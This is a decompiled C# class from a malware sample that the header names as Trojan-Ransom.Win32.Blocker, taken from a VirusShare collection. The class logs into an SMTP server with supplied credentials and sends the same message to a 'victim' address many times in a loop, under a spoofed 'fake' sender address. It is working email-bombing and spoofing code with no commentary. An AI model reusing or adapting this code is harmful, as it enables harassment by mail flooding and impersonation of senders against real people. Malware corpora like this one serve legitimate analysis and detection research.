// Decompiled with JetBrains decompiler
// Type: n3ux.Mail
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 807F4FF6-398F-45B5-8EC1-50AF57383C19
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.avxv-c9e0300c4b5a251c76c291f23c0d27537f89d4b9.exe

using System.Net;
using System.Net.Mail;

namespace n3ux
{
  internal class Mail
  {
    private SmtpClient server;
    private string mailVictima;
    private string mailFake;
    private string text;
    private string subject;

    public Mail(
      string mailServer,
      string emailOrigen,
      string pass,
      string emailVictima,
      string emailFake,
      string asunto,
      string texto)
    {
      this.server = new SmtpClient(mailServer);
      this.server.Credentials = (ICredentialsByHost) new NetworkCredential(emailOrigen, pass);
      this.server.EnableSsl = true;
      this.mailVictima = emailVictima;
      this.mailFake = emailFake;
      this.text = texto;
      this.subject = asunto;
    }

    public void sendMail(int n)
    {
      MailMessage message = new MailMessage();
      message.Subject = this.subject;
      message.To.Add(new MailAddress(this.mailVictima));
      message.From = new MailAddress(this.mailFake, this.mailFake);
      message.Body = this.text;
      for (int index = 0; index < n; ++index)
        this.server.Send(message);
    }
  }
}
